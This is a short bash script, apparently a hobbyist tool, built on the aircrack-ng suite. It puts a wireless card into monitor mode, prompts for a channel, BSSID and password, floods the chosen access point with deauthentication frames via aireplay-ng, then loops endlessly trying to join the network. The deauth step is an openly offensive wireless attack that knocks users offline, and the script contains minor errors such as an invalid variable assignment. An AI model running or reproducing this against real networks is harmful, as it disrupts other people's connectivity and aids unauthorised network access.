airmon-ng start wlp2s0;
airodump-ng wlp2s0mon
echo -n "Enter the channel : "
read -e channel
echo -n "Enter the password : "
read -e password
echo -n "Enter bssid : "
read -e bssid
airodump-ng --channel ${channel} --bssid ${bssid} wlp2s0mon;
aireplay-ng --deauth 10 -a ${bssid}  wlp2s0mon;
airmon-ng stop wlp2s0mon;
systemctl start NetworkManager;
index = 0
while true
do
	nmcli device wifi connect ${bssid} password ${password};
	sleep 3
done
